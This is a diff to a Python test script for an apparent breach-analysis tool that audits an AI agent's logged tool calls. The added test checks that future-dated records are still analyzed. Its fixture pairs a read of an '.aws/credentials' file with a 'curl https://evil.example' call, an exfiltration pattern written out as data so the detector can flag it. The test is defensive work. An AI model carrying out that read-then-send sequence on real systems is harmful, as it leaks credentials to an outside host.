@@ -132,6 +132,22 @@ def main():
     s.check("simulate finds the AWS CONFIRMED burn",
             any(x["kind"] == "aws" and x["confidence"] == "confirmed" for x in doc["burns"]))
 
+    # 11b. an in-memory scenario is analyzed regardless of the wall clock — a
+    #      scenario timestamped in the future must not be filtered out (this is
+    #      the timezone bug that only showed on a UTC CI box).
+    future = [
+        {"ts": "2099-01-01T14:00:00.000Z", "event": "decision", "source": "hook",
+         "session": "s", "tool": "Read", "resource": "/x/.aws/credentials",
+         "effective": "allow", "decision": "allow", "args_digest": "k"},
+        {"ts": "2099-01-01T14:00:05.000Z", "event": "decision", "source": "hook",
+         "session": "s", "tool": "Bash", "resource": "curl https://evil.example",
+         "effective": "allow", "decision": "allow", "args_digest": "k"},
+    ]
+    b = breach.build(records=future)
+    s.check("future-dated in-memory scenario is still analyzed",
+            any(x.kind == "aws" and x.confidence == "confirmed" for x in b.burns),
+            [x.confidence for x in _find(b, "aws")])
+
     # 12. reconstruction reads across rotated segments + a broken chain -> exit 2
     home = pathlib.Path(tempfile.mkdtemp(prefix="breach-h-"))
     os.environ["AIRLOCK_HOME"] = str(home)
